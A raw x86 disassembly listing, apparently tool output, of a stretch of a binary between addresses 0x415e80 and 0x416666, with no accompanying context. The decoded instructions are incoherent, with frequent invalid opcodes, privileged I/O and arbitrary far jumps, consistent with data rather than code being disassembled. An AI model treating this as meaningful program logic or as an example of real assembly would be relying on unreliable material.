  415e80:	das    
  415e81:	fs jbe 0x415edd
  415e84:	lahf   
  415e85:	ret    0x4e21
  415e88:	push   eax
  415e89:	(bad)  
  415e8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e8b:	xlat   BYTE PTR ds:[ebx]
  415e8c:	inc    ecx
  415e8d:	pop    eax
  415e8e:	jae    0x415efb
  415e90:	add    esp,DWORD PTR [edi-0x5be319d6]
  415e96:	out    0xe3,al
  415e98:	ror    DWORD PTR [esi+0xb46b1e0],cl
  415e9e:	xor    BYTE PTR [edi-0x67],0x1f
  415ea2:	cmp    dh,bh
  415ea4:	daa    
  415ea5:	jl     0x415eee
  415ea7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ea8:	cmc    
  415ea9:	xchg   al,bh
  415eab:	jns    0x415eec
  415ead:	test   eax,edi
  415eaf:	pop    ss
  415eb0:	inc    ecx
  415eb1:	xor    al,0x37
  415eb3:	inc    edx
  415eb4:	hlt    
  415eb5:	shr    BYTE PTR [edx+eax*4],0x8d
  415eb9:	inc    ecx
  415eba:	or     al,bh
  415ebc:	mov    al,ds:0xdc5b661d
  415ec1:	xlat   BYTE PTR cs:[ebx]
  415ec3:	pop    esi
  415ec4:	and    edi,DWORD PTR [esi]
  415ec6:	ret    
  415ec7:	popa   
  415ec8:	fld    TBYTE PTR [esi*4+0x6a7ac80f]
  415ecf:	scas   eax,DWORD PTR es:[edi]
  415ed0:	cmp    al,0xcd
  415ed2:	int    0x1d
  415ed4:	in     eax,dx
  415ed5:	cli    
  415ed6:	xor    eax,0x89935d2f
  415edb:	cmp    al,0x9c
  415edd:	nop
  415ede:	out    dx,al
  415edf:	and    BYTE PTR ds:0x1293c4d9,0x88
  415ee6:	push   0xffffff97
  415ee8:	js     0x415f4d
  415eea:	pop    edx
  415eeb:	dec    edi
  415eec:	dec    ebx
  415eed:	sub    ch,dl
  415eef:	scas   al,BYTE PTR es:[edi]
  415ef0:	jae    0x415f2a
  415ef2:	retf   0x5e20
  415ef5:	mov    dl,0x2b
  415ef7:	sahf   
  415ef8:	les    ecx,FWORD PTR [ecx]
  415efa:	mov    esi,0x8287311d
  415eff:	adc    ah,BYTE PTR [esi]
  415f01:	retf   
  415f02:	icebp  
  415f03:	sub    al,0x45
  415f05:	das    
  415f06:	or     esp,DWORD PTR [ecx+0x36]
  415f09:	in     eax,0x8
  415f0b:	cmp    BYTE PTR [edi-0x50607124],al
  415f11:	xchg   edi,eax
  415f12:	js     0x415eb1
  415f14:	jle    0x415f27
  415f16:	dec    ecx
  415f17:	lahf   
  415f18:	mov    eax,ds:0xb6521398
  415f1d:	sbb    al,0x27
  415f1f:	xor    DWORD PTR [edi-0x75153cd1],0xffffffc7
  415f26:	mov    WORD PTR [esi],?
  415f28:	retf   
  415f29:	push   es
  415f2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f2b:	and    al,0x95
  415f2d:	pop    eax
  415f2e:	xchg   edx,eax
  415f2f:	cmc    
  415f30:	sub    ecx,edx
  415f32:	or     ebx,DWORD PTR [bp+di-0x3835]
  415f37:	xchg   ebx,eax
  415f38:	gs out dx,al
  415f3a:	mov    al,ds:0xe1bd741a
  415f3f:	xor    al,0xa7
  415f41:	and    ah,cl
  415f43:	scas   eax,DWORD PTR es:[edi]
  415f44:	gs push es
  415f46:	pop    es
  415f47:	dec    esp
  415f48:	dec    ecx
  415f49:	or     al,0x5
  415f4b:	xchg   esi,eax
  415f4c:	aas    
  415f4d:	mov    ebp,0x4d57904
  415f52:	mov    cl,0x28
  415f54:	mov    ebp,0x133e8e1
  415f59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f5a:	retf   0xf6c1
  415f5d:	scas   al,BYTE PTR es:[edi]
  415f5e:	sahf   
  415f5f:	adc    al,0x12
  415f61:	xchg   BYTE PTR [ebp-0x5d],bl
  415f64:	sahf   
  415f65:	and    al,0x42
  415f67:	sti    
  415f68:	push   ds
  415f69:	scas   eax,DWORD PTR es:[edi]
  415f6a:	jnp    0x415fa4
  415f6c:	rol    DWORD PTR [edi+0x544bb417],0x59
  415f73:	scas   al,BYTE PTR es:[edi]
  415f74:	inc    ebp
  415f75:	jns    0x415fa6
  415f77:	imul   esp,DWORD PTR [edx+ebx*2+0x77],0x98f0d85b
  415f7f:	ins    BYTE PTR es:[edi],dx
  415f80:	push   ebp
  415f81:	int    0x84
  415f83:	push   eax
  415f84:	dec    ebp
  415f85:	loop   0x415fb2
  415f87:	fwait
  415f88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f89:	inc    esi
  415f8a:	push   esi
  415f8b:	pop    ds
  415f8c:	mov    bh,0xe1
  415f8e:	call   0x5af01b31
  415f93:	jmp    0x7378:0x816acdc9
  415f9a:	push   esp
  415f9b:	pop    ss
  415f9c:	out    0x54,al
  415f9e:	loopne 0x415f24
  415fa0:	pop    ss
  415fa1:	aas    
  415fa2:	xchg   esi,eax
  415fa3:	jge    0x415ffb
  415fa5:	cwde   
  415fa6:	in     al,dx
  415fa7:	and    BYTE PTR [edx+0x29],0x4e
  415fab:	(bad)  
  415fac:	bound  esi,QWORD PTR [edx+0x5592a6aa]
  415fb2:	dec    esi
  415fb3:	mov    ebp,edx
  415fb5:	mov    WORD PTR [ecx+0x234fd2f2],fs
  415fbb:	pop    ecx
  415fbc:	stc    
  415fbd:	mov    ebx,0x1ae1f4bd
  415fc2:	dec    esp
  415fc3:	data16 fwait
  415fc5:	add    eax,DWORD PTR [esi+0x3b]
  415fc8:	add    dh,BYTE PTR [eax+ebx*2]
  415fcb:	mov    ecx,0x5eb1f3bc
  415fd0:	xchg   BYTE PTR [edx],dh
  415fd2:	mov    dl,0x89
  415fd4:	dec    ebp
  415fd5:	rol    BYTE PTR [esi-0x7617ba5c],1
  415fdb:	lods   al,BYTE PTR ds:[esi]
  415fdc:	into   
  415fdd:	xchg   edi,eax
  415fde:	cmp    ah,BYTE PTR [ecx]
  415fe0:	pop    esp
  415fe1:	aas    
  415fe2:	add    al,0x11
  415fe5:	jp     0x415f73
  415fe7:	mul    BYTE PTR [ebp-0x3c95272a]
  415fed:	xchg   esi,eax
  415fee:	and    bl,BYTE PTR [eax]
  415ff0:	push   ebx
  415ff1:	(bad)  [edx]
  415ff3:	pop    ebp
  415ff4:	dec    esi
  415ff5:	dec    edx
  415ff6:	jg     0x416067
  415ff8:	adc    BYTE PTR cs:[ecx+ebp*2],al
  415ffc:	imul   esi,DWORD PTR ds:0x99a14b7f,0x61
  416003:	sub    eax,edi
  416005:	mov    ch,0x93
  416007:	inc    edx
  416008:	sub    al,0x18
  41600a:	inc    esp
  41600b:	sbb    ebp,DWORD PTR [ecx-0x31b3f4eb]
  416011:	jp     0x416023
  416013:	arpl   WORD PTR [edi],bx
  416015:	fcomp  QWORD PTR [ebp+0x33]
  416018:	sbb    BYTE PTR gs:[edi-0x5],bl
  41601c:	add    bh,0xd0
  41601f:	rcr    DWORD PTR [ecx+0x73],cl
  416022:	dec    esp
  416023:	aas    
  416024:	mov    cs,WORD PTR [edi+0x2e]
  416027:	pushf  
  416028:	xor    BYTE PTR [ecx+0x2c16bfac],bl
  41602e:	pusha  
  41602f:	xchg   ebp,eax
  416030:	jmp    0x415fcb
  416032:	xchg   ebp,eax
  416033:	in     eax,0x3c
  416035:	push   0xffffffdc
  416037:	or     eax,0x3a39aa3a
  41603c:	cs dec ecx
  41603e:	sub    ebp,esi
  416040:	mov    dl,0xfc
  416042:	mov    al,ds:0x19be2e4d
  416047:	push   ss
  416048:	mov    bl,0xb0
  41604a:	xlat   BYTE PTR ds:[ebx]
  41604b:	outs   dx,BYTE PTR es:[esi]
  41604d:	xchg   esi,eax
  41604e:	fucomip st,st(7)
  416050:	lds    esp,FWORD PTR [ebx+0x68a801eb]
  416056:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  416058:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416059:	jbe    0x416053
  41605b:	mov    esi,0x3155d848
  416060:	scas   al,BYTE PTR es:[edi]
  416061:	cmp    bh,0x6
  416064:	push   0xce2f5394
  416069:	scas   al,BYTE PTR es:[edi]
  41606a:	ror    DWORD PTR ds:0x65e45c3a,1
  416070:	inc    ecx
  416071:	adc    ah,BYTE PTR [esi-0x68ca05e5]
  416077:	arpl   WORD PTR [edx],sp
  416079:	iret   
  41607a:	or     BYTE PTR [eax+0x13],cl
  41607d:	fadd   DWORD PTR [esi+0x44]
  416080:	cmp    esp,edx
  416082:	mov    bh,0xe3
  416084:	sti    
  416085:	cmp    DWORD PTR ds:0xdced1779,0xffffffc4
  41608c:	mov    BYTE PTR ds:0xc1075ad3,dh
  416092:	pop    esp
  416093:	adc    eax,DWORD PTR [eax-0x3b]
  416096:	cld    
  416097:	(bad)  
  416098:	inc    ecx
  416099:	icebp  
  41609a:	xchg   edx,eax
  41609b:	or     BYTE PTR ds:0x73774175,cl
  4160a1:	mov    bh,0x41
  4160a3:	sbb    edx,ecx
  4160a5:	pop    ss
  4160a6:	stc    
  4160a7:	sbb    edx,DWORD PTR [edx+esi*1+0x48]
  4160ab:	fsubp  st(0),st
  4160ad:	sub    dl,BYTE PTR [ecx]
  4160af:	xor    ecx,DWORD PTR [edx]
  4160b1:	dec    esp
  4160b2:	repz (bad) [ebp+0x32bfff75]
  4160b9:	ja     0x41606e
  4160bb:	mov    ebp,0xf7439e7b
  4160c0:	pop    edi
  4160c1:	sbb    BYTE PTR [ebx-0x2d],ch
  4160c4:	add    eax,0x81a2060d
  4160c9:	sbb    BYTE PTR [edx],cl
  4160cb:	shl    ecx,0xde
  4160ce:	push   ds
  4160cf:	out    0x2d,al
  4160d1:	or     ch,ch
  4160d3:	add    ah,BYTE PTR [ecx-0x7c]
  4160d6:	adc    al,0xad
  4160d8:	into   
  4160d9:	test   DWORD PTR [edi],0x66f384f0
  4160df:	shl    edx,cl
  4160e1:	sub    DWORD PTR [edi*4-0x31a75a99],edx
  4160e8:	mov    DWORD PTR [edi],esp
  4160ea:	shl    edi,0x9a
  4160ed:	fistp  DWORD PTR [eax-0x4f]
  4160f0:	dec    edi
  4160f1:	dec    ebx
  4160f2:	fstp   DWORD PTR [esi]
  4160f4:	push   esp
  4160f5:	inc    eax
  4160f6:	pusha  
  4160f7:	test   BYTE PTR [eax-0x4e],cl
  4160fa:	jo     0x416163
  4160fc:	mov    eax,ds:0x41ce53d3
  416101:	inc    esp
  416102:	icebp  
  416103:	ret    0x9496
  416106:	and    eax,0x1ec1aba9
  41610b:	mov    DWORD PTR [ebp+ecx*2+0x53],edx
  41610f:	dec    edx
  416110:	pop    edx
  416111:	jno    0x416097
  416113:	div    eax
  416115:	xchg   ebp,eax
  416116:	mov    dl,0xb2
  416118:	xchg   ebp,esi
  41611a:	or     esp,DWORD PTR ds:0x40682072
  416120:	mov    ah,0x9d
  416122:	sub    eax,0x62f4e7f5
  416127:	jns    0x4160fc
  416129:	push   es
  41612a:	jecxz  0x4160b6
  41612c:	inc    esp
  41612d:	sbb    esi,DWORD PTR ds:0x23896f36
  416133:	in     eax,dx
  416134:	(bad)  
  416135:	scas   al,BYTE PTR es:[edi]
  416136:	jecxz  0x41613d
  416138:	jno    0x416130
  41613a:	jns    0x41615e
  41613c:	and    eax,0xad2a0eb2
  416141:	fidivr DWORD PTR [eax]
  416143:	or     ch,BYTE PTR [ebx-0x631694a1]
  416149:	push   ecx
  41614a:	les    ebp,FWORD PTR [ebx+0x5]
  41614d:	ret    0x43cd
  416150:	xor    DWORD PTR [ebx+0x40e529a8],ebp
  416156:	add    ebp,DWORD PTR [eax-0x3fe7c9cd]
  41615c:	sbb    esp,0x821b3526
  416162:	and    al,0x2c
  416164:	mov    ah,0x3f
  416166:	imul   esi,DWORD PTR [ebx*2-0x53b4f063],0x3f4f5261
  416171:	inc    edx
  416172:	add    BYTE PTR [esi+0x5e],0xf4
  416176:	lock test DWORD PTR [edx-0x68ae137d],esp
  41617d:	push   cs
  41617e:	pop    edx
  41617f:	inc    ebp
  416180:	fiadd  DWORD PTR [eax]
  416182:	jae    0x416163
  416184:	jo     0x41615d
  416186:	jmp    0x3e64:0x22e136fc
  41618d:	xchg   ebx,eax
  41618e:	pop    edx
  41618f:	mov    eax,ds:0x3c85eb52
  416194:	xchg   edi,eax
  416195:	inc    edi
  416196:	xor    DWORD PTR [eax-0x2018322b],ebp
  41619c:	cmp    ecx,DWORD PTR [eax]
  41619e:	les    edi,FWORD PTR [ebx]
  4161a0:	inc    ebp
  4161a1:	sbb    eax,0x58e23732
  4161a6:	ret    
  4161a7:	xchg   esi,eax
  4161a8:	test   DWORD PTR [eax+0x4a6f1507],0x1fe319aa
  4161b2:	mov    bl,0xe9
  4161b4:	scas   eax,DWORD PTR es:[edi]
  4161b5:	imul   edx,DWORD PTR [ecx],0x60
  4161b8:	addr16 jle 0x416233
  4161bb:	lods   eax,DWORD PTR ds:[esi]
  4161bc:	(bad)  [edx]
  4161be:	push   ss
  4161bf:	push   ecx
  4161c0:	lds    eax,FWORD PTR [eax-0x15465c7d]
  4161c6:	or     eax,0x5c9688f9
  4161cb:	jmp    0x1917:0xefbd4979
  4161d2:	aas    
  4161d3:	xor    ah,BYTE PTR [edi]
  4161d5:	push   ds
  4161d6:	jmp    0xfc35:0x6a6320bd
  4161dd:	dec    ebx
  4161de:	dec    edi
  4161df:	nop
  4161e0:	add    dl,dh
  4161e2:	inc    ebp
  4161e3:	pop    ecx
  4161e4:	mov    eax,0xd4631e39
  4161e9:	lea    edi,[eax+eiz*4]
  4161ec:	loop   0x4161fb
  4161ee:	add    eax,0xbd33b910
  4161f3:	or     DWORD PTR [ebp-0x2a37e7cf],ebp
  4161f9:	and    edx,DWORD PTR [eax+0x1b]
  4161fc:	(bad)  
  4161fe:	sub    edi,DWORD PTR [esi+eiz*2-0x4b467685]
  416205:	dec    ebp
  416206:	xor    al,0xc8
  416208:	and    eax,0x9e4641b4
  41620d:	mov    eax,ds:0x32ca8543
  416212:	jmp    0x416277
  416214:	imul   ebx,DWORD PTR [ecx+0x13985782],0x8f0f4e0d
  41621e:	je     0x4161ae
  416220:	inc    edx
  416221:	int3   
  416222:	cmp    bh,al
  416224:	mov    gs,ebp
  416226:	mov    ebx,0x475e5ddf
  41622b:	sbb    dl,BYTE PTR [ecx-0x4b]
  41622e:	mov    edi,0x98d90b6e
  416233:	loopne 0x4161c2
  416235:	jo     0x41626f
  416237:	fldcw  WORD PTR [esi]
  416239:	add    eax,0x9101da4e
  41623e:	outs   dx,DWORD PTR ds:[esi]
  41623f:	jae    0x416203
  416241:	retf   0x62e0
  416244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416245:	jb     0x4162c3
  416247:	jge    0x416225
  416249:	push   esi
  41624a:	mov    dh,0x6c
  41624c:	pop    esp
  41624d:	test   al,0x30
  41624f:	push   ebx
  416250:	ret    0x9619
  416253:	dec    ecx
  416254:	mov    eax,0x9cb65f19
  416259:	dec    eax
  41625a:	adc    eax,0xbd8f579c
  41625f:	shr    BYTE PTR [eax-0x27b72679],cl
  416265:	dec    esp
  416266:	(bad)  
  416267:	jp     0x416274
  416269:	adc    dl,BYTE PTR [esi-0x6d1a7c71]
  41626f:	pop    eax
  416270:	repnz pop ds
  416272:	push   esp
  416273:	jge    0x416297
  416275:	out    dx,al
  416276:	retf   0x7081
  416279:	mov    ds:0xd65362f4,al
  41627e:	ds xchg esi,eax
  416280:	jmp    0x70a:0x193d1e26
  416287:	push   ds
  416288:	cmp    eax,0x3c9c4da4
  41628d:	stos   DWORD PTR es:[edi],eax
  41628e:	fdiv   st,st(1)
  416290:	sub    DWORD PTR [edi+0x24],ebx
  416293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416294:	inc    esp
  416295:	inc    ecx
  416296:	retf   
  416297:	xor    BYTE PTR [edi-0x3afbb723],ah
  41629d:	or     al,cl
  41629f:	push   ebp
  4162a0:	cmp    eax,0x5c6697be
  4162a5:	imul   ebp,DWORD PTR [edx],0x5b8e6eee
  4162ab:	js     0x41629f
  4162ad:	mov    ebp,0x5a619f86
  4162b2:	repz jns 0x416238
  4162b5:	out    dx,al
  4162b6:	fld    st(1)
  4162b8:	mov    eax,ds:0x9c092ae4
  4162bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162be:	adc    esi,ecx
  4162c0:	test   al,0x9a
  4162c2:	dec    esp
  4162c3:	ja     0x416320
  4162c5:	dec    esi
  4162c6:	mul    BYTE PTR [ebx+eiz*8]
  4162c9:	push   ss
  4162ca:	pusha  
  4162cb:	jo     0x4162ff
  4162cd:	sbb    DWORD PTR [edx],0x1a9768d7
  4162d3:	mov    bl,0x6b
  4162d5:	add    BYTE PTR [ebp-0x5147f0d0],ah
  4162db:	out    dx,eax
  4162dc:	mov    eax,DWORD PTR [edx+0x6b]
  4162df:	popa   
  4162e0:	and    eax,0x4313b52
  4162e5:	adc    esp,esi
  4162e7:	sub    eax,0xe0723451
  4162ec:	sahf   
  4162ed:	ss ins BYTE PTR es:[edi],dx
  4162ef:	in     al,0x7b
  4162f1:	rcl    ecx,0x8f
  4162f4:	mov    ebx,0x64eccaf4
  4162f9:	and    bl,al
  4162fb:	xchg   ecx,eax
  4162fc:	test   eax,0x79a78888
  416301:	mov    bl,0x24
  416303:	mov    ds:0x8311f6cb,al
  416308:	fs push 0x27dcf271
  41630e:	(bad)  [edi-0x7bd84ee9]
  416314:	les    esp,FWORD PTR [esi-0x2a]
  416317:	loope  0x416364
  416319:	jl     0x416340
  41631b:	ret    
  41631c:	nop
  41631d:	mov    dl,0x64
  41631f:	xchg   ebp,eax
  416320:	lods   al,BYTE PTR ds:[esi]
  416321:	and    ah,BYTE PTR [edi-0x25]
  416324:	xor    bh,dh
  416326:	push   0xffffffdc
  416328:	mov    dh,0xc0
  41632a:	into   
  41632b:	int3   
  41632c:	jae    0x4162d8
  41632e:	mov    ?,ecx
  416330:	mov    al,0x0
  416332:	add    DWORD PTR [ecx-0x5f],esp
  416335:	mul    BYTE PTR [ecx]
  416337:	cs and eax,0xebfed3e6
  41633d:	xor    BYTE PTR [ebp+0x135b02b5],ah
  416343:	shr    BYTE PTR [eax],0x88
  416346:	adc    DWORD PTR [esi+0x6bbeb296],esp
  41634c:	sub    ebp,esp
  41634e:	call   0xab904a41
  416353:	adc    al,0xa3
  416355:	sub    al,0xbc
  416357:	je     0x416332
  416359:	(bad)  
  41635a:	lods   al,BYTE PTR ds:[esi]
  41635b:	push   esi
  41635c:	push   eax
  41635d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41635e:	cmp    al,0x10
  416360:	in     al,0x6c
  416362:	sbb    eax,0xcb600222
  416367:	cwde   
  416368:	and    ah,bl
  41636a:	iret   
  41636b:	mov    al,ds:0x1252ffa
  416370:	div    BYTE PTR [edi]
  416372:	dec    ebp
  416373:	mul    DWORD PTR [eax]
  416375:	xchg   ebp,eax
  416376:	mov    dl,0x35
  416378:	cdq    
  416379:	ror    BYTE PTR [ebx],0x1d
  41637c:	pop    edx
  41637d:	pop    esi
  41637e:	shr    ah,0xe7
  416381:	popa   
  416382:	mov    ds:0x3f2a1405,eax
  416387:	cmp    DWORD PTR [esp-0x5a3b449a],0xf7011406
  416392:	dec    eax
  416393:	push   cs
  416394:	ja     0x4163b5
  416396:	pop    edx
  416397:	outs   dx,DWORD PTR ds:[esi]
  416398:	out    dx,eax
  416399:	lea    eax,[eax-0x76]
  41639c:	mov    ds:0xf21020a0,al
  4163a1:	xchg   esi,eax
  4163a2:	ss mov bl,0xce
  4163a5:	je     0x41640f
  4163a7:	xchg   edx,eax
  4163a8:	fild   WORD PTR ds:0x2e97f3c8
  4163ae:	sub    BYTE PTR [esi],ah
  4163b0:	cmp    DWORD PTR [esi],ebx
  4163b2:	inc    ebx
  4163b3:	fdivr  st(3),st
  4163b5:	nop
  4163b6:	cmp    esi,ebx
  4163b8:	add    cl,BYTE PTR [ecx+0x17f881b0]
  4163be:	and    eax,0x484786e0
  4163c3:	fist   WORD PTR [edi+eiz*4]
  4163c6:	dec    esi
  4163c7:	adc    eax,0x5c90fd90
  4163cc:	leave  
  4163cd:	mov    DWORD PTR [eax],ebx
  4163cf:	xchg   esi,eax
  4163d0:	ss add al,0x3e
  4163d3:	cmc    
  4163d4:	mul    BYTE PTR [esi+0x4e]
  4163d7:	push   ecx
  4163d8:	popf   
  4163d9:	ds stos BYTE PTR es:[edi],al
  4163db:	stc    
  4163dc:	stc    
  4163dd:	ret    0x7076
  4163e0:	sbb    al,BYTE PTR [esi+esi*4]
  4163e3:	setle  BYTE PTR [edx-0x50]
  4163e7:	add    BYTE PTR es:[eax+0x69],0x97
  4163ec:	jmp    0xbf274136
  4163f1:	pop    ds
  4163f2:	loop   0x4163c8
  4163f4:	and    ah,BYTE PTR [eax+edx*1-0x62ed280c]
  4163fb:	jmp    0x1b08d427
  416400:	fwait
  416401:	lds    ebp,FWORD PTR [ebx-0x7fafc819]
  416407:	js     0x416474
  416409:	mov    cs,WORD PTR [eax-0x5b9a27e7]
  41640f:	sub    eax,0x706eaac9
  416414:	and    ch,dh
  416416:	cmc    
  416417:	and    eax,0xda03c476
  41641c:	push   0xffffffe9
  41641e:	sub    ch,BYTE PTR [eax-0x48b996f7]
  416424:	mov    ecx,0x3469127e
  416429:	cmp    al,0x6a
  41642b:	bound  esp,QWORD PTR [edx]
  41642d:	add    al,0xf8
  41642f:	push   ebx
  416430:	jmp    0x66bc:0xc836dbd4
  416437:	sub    eax,DWORD PTR [ebx-0x48]
  41643a:	call   0x725:0x6a6ec775
  416441:	(bad)  
  416442:	rcl    edx,1
  416444:	cmc    
  416445:	and    eax,0xd76f78fc
  41644a:	stc    
  41644b:	jmp    DWORD PTR [ebx]
  41644d:	and    eax,DWORD PTR [ebp+ebx*4+0x3c1ae175]
  416454:	fisub  DWORD PTR [eax]
  416456:	and    al,0xb0
  416458:	add    cl,cl
  41645a:	fwait
  41645b:	mov    ch,0xaf
  41645d:	sbb    BYTE PTR [eax-0xa],0xe2
  416461:	imul   ecx,DWORD PTR [eax+edi*4-0xf8ef7c5],0x473188af
  41646c:	lea    edi,ds:0x2592a199
  416472:	xlat   BYTE PTR ds:[ebx]
  416473:	dec    ebx
  416474:	ins    DWORD PTR es:[edi],dx
  416475:	xchg   ebx,eax
  416476:	lods   al,BYTE PTR ds:[esi]
  416477:	xchg   ebx,eax
  416478:	dec    eax
  416479:	cmp    BYTE PTR [edx+edi*2],bh
  41647c:	xlat   BYTE PTR ds:[ebx]
  41647d:	cmp    esi,DWORD PTR ds:0x7a3c616b
  416483:	xor    DWORD PTR [ebp+0x55422f0d],ecx
  416489:	xchg   ebp,eax
  41648a:	aad    0xe3
  41648c:	icebp  
  41648d:	jnp    0x416478
  41648f:	stc    
  416490:	mov    al,ds:0x444678fe
  416495:	sbb    ebp,DWORD PTR [edx+0x59]
  416498:	xchg   esi,eax
  416499:	std    
  41649a:	adc    eax,0xf874af64
  41649f:	dec    ecx
  4164a0:	xchg   ecx,eax
  4164a1:	in     al,dx
  4164a2:	gs into 
  4164a4:	push   es
  4164a5:	les    esi,FWORD PTR [esi+ecx*4]
  4164a8:	out    0x5e,eax
  4164aa:	add    DWORD PTR [esi+0x1c],ecx
  4164ad:	(bad)  
  4164ae:	and    BYTE PTR [edx],al
  4164b0:	mul    BYTE PTR [ebx]
  4164b2:	push   ss
  4164b3:	outs   dx,BYTE PTR ds:[esi]
  4164b4:	or     esi,DWORD PTR [esi+0x40d63a9]
  4164ba:	jmp    0x41651a
  4164bc:	xchg   esi,eax
  4164bd:	jle    0x416443
  4164bf:	jno    0x41646e
  4164c1:	hlt    
  4164c2:	push   edx
  4164c3:	ss jmp 0xd9d07a9f
  4164c9:	jno    0x416488
  4164cb:	add    cl,ch
  4164cd:	out    0x95,eax
  4164cf:	aad    0x6e
  4164d1:	ss dec esi
  4164d3:	xchg   ebx,eax
  4164d4:	inc    edx
  4164d5:	cmp    al,0x28
  4164d7:	retf   
  4164d8:	mov    ecx,0x8ff9d18d
  4164dd:	xchg   ebx,eax
  4164de:	int    0x72
  4164e0:	jmp    0x4164a1
  4164e2:	pmaxsw mm1,mm0
  4164e5:	das    
  4164e6:	mov    dl,0xe5
  4164e8:	jbe    0x41648c
  4164ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164eb:	inc    ebp
  4164ec:	pusha  
  4164ed:	xor    ebx,DWORD PTR [esi]
  4164ef:	aaa    
  4164f0:	xchg   edi,eax
  4164f1:	and    ch,dh
  4164f3:	mov    DWORD PTR [ecx],esp
  4164f5:	push   edi
  4164f6:	sbb    DWORD PTR [edi+0x943b232],0xffffffd8
  4164fd:	pop    ds
  4164fe:	sbb    DWORD PTR [ebp+0x71],ecx
  416501:	mov    esp,0x7d0c25c
  416506:	add    eax,0xbbbafe73
  41650b:	pop    ds
  41650c:	jnp    0x416569
  41650e:	mov    ebx,0xf2b68578
  416513:	mov    dl,BYTE PTR [ebx+0x29]
  416516:	add    edx,ebx
  416518:	push   esp
  416519:	mov    eax,0x445dfd84
  41651e:	int3   
  41651f:	shl    edi,0xb4
  416522:	in     eax,dx
  416523:	loop   0x4164ba
  416525:	inc    edx
  416526:	rcr    bl,1
  416528:	daa    
  416529:	xor    eax,0xf2c963f6
  41652e:	dec    ebp
  41652f:	(bad)
  416533:	ret    
  416534:	out    0xed,al
  416536:	xor    al,0xaf
  416538:	mov    BYTE PTR [esi-0x3c605736],bh
  41653e:	mov    esi,0xe36ed67b
  416543:	push   esi
  416544:	gs add al,0x2a
  416547:	sbb    DWORD PTR [ecx+0x34],0xfffffff2
  41654b:	outs   dx,BYTE PTR ds:[esi]
  41654c:	mov    ebx,0xb34fe5e2
  416551:	outs   dx,DWORD PTR ds:[esi]
  416552:	pop    ds
  416553:	fldenv [ebx+0x42a85270]
  416559:	popa   
  41655a:	push   eax
  41655b:	aas    
  41655c:	xchg   bl,ch
  41655e:	cmp    eax,0x8ce3a379
  416563:	mov    bl,dh
  416565:	icebp  
  416566:	inc    edx
  416567:	mov    bh,al
  416569:	outs   dx,BYTE PTR ds:[esi]
  41656a:	fdivr  QWORD PTR [esi-0x4d]
  41656d:	retf   
  41656e:	add    ecx,DWORD PTR [ebx+0x56a4e0b9]
  416574:	mov    edi,0xb7ab91a9
  416579:	push   0xffffffdf
  41657b:	dec    ebp
  41657c:	pop    ds
  41657d:	mov    DWORD PTR [eax],edx
  41657f:	pushf  
  416580:	dec    ebp
  416581:	rcl    DWORD PTR [edx+0x63],cl
  416584:	jecxz  0x41655f
  416586:	daa    
  416587:	add    ebx,0xa8d5bebd
  41658d:	repnz push 0x9c3d4cfc
  416593:	cmp    DWORD PTR [esi+0x6d],eax
  416596:	xor    BYTE PTR [esp+eax*4+0x3e],dl
  41659a:	ror    DWORD PTR [eax-0x1cc393a0],cl
  4165a0:	rcl    BYTE PTR [ebp+0x2c],0xc3
  4165a4:	jnp    0x416538
  4165a6:	lods   eax,DWORD PTR ds:[esi]
  4165a7:	pop    edx
  4165a8:	into   
  4165a9:	ja     0x416609
  4165ab:	inc    edi
  4165ac:	pop    ecx
  4165ad:	nop
  4165ae:	mov    eax,0x98c842e1
  4165b3:	cmp    al,0xb3
  4165b5:	push   edx
  4165b6:	imul   BYTE PTR [ebx]
  4165b8:	ror    dh,0x69
  4165bb:	add    al,0x13
  4165bd:	jmp    0x8eb7:0x982fb65e
  4165c4:	mov    esp,0xad215d42
  4165c9:	or     eax,0xaf9f1daa
  4165ce:	cli    
  4165cf:	dec    esi
  4165d0:	and    dh,ah
  4165d2:	sub    ebp,DWORD PTR [ecx-0x18]
  4165d5:	or     al,0xeb
  4165d7:	add    eax,0x1216d9dd
  4165dc:	mov    dh,0x5
  4165de:	in     eax,dx
  4165df:	test   DWORD PTR [edx-0x3bd217e6],0xb587dd91
  4165e9:	hlt    
  4165ea:	adc    esp,eax
  4165ec:	add    eax,0xe761d66c
  4165f1:	cmp    al,0xa3
  4165f3:	ds das 
  4165f5:	inc    ebp
  4165f6:	pop    esp
  4165f7:	nop
  4165f8:	psubusw mm5,mm5
  4165fb:	in     al,dx
  4165fc:	or     al,0x7d
  4165fe:	push   0x1f
  416600:	test   DWORD PTR [ebp-0x38f8f1fa],ebx
  416606:	data16 jge 0x41658a
  416609:	jp     0x41659b
  41660b:	(bad)  
  41660c:	jmp    0xb822a049
  416611:	cld    
  416612:	(bad)  
  416613:	xor    edi,DWORD PTR [edi+edi*8]
  416616:	push   ecx
  416617:	mov    edx,0xe9224659
  41661c:	push   eax
  41661d:	mov    ds:0x8b3f9851,eax
  416622:	hlt    
  416623:	dec    ebp
  416624:	test   DWORD PTR [ecx+esi*1-0x80],ebp
  416628:	mov    eax,ds:0xcfb2bc08
  41662d:	jmp    0xab0b8678
  416632:	loope  0x416636
  416634:	loop   0x416619
  416636:	cld    
  416637:	call   0xef29:0xda52d591
  41663e:	cmp    edi,esp
  416640:	adc    cl,BYTE PTR [edi]
  416642:	or     DWORD PTR [ecx+0x56],ebx
  416645:	mov    cl,cl
  416647:	imul   esi,edx,0x68
  41664a:	dec    esi
  41664b:	int    0xdc
  41664d:	pop    edi
  41664e:	in     eax,dx
  41664f:	or     BYTE PTR [ebp+0x7f],dh
  416652:	mov    ebp,0x341d2fd5
  416657:	icebp  
  416658:	pushf  
  416659:	stc    
  41665a:	lods   al,BYTE PTR ds:[esi]
  41665b:	icebp  
  41665c:	pop    edx
  41665d:	mov    ebx,DWORD PTR [ecx+edx*4-0x72]
  416661:	sbb    al,0xa5
  416663:	pop    ss
  416664:	jmp    0x416693
  416666:	and    ch,dh
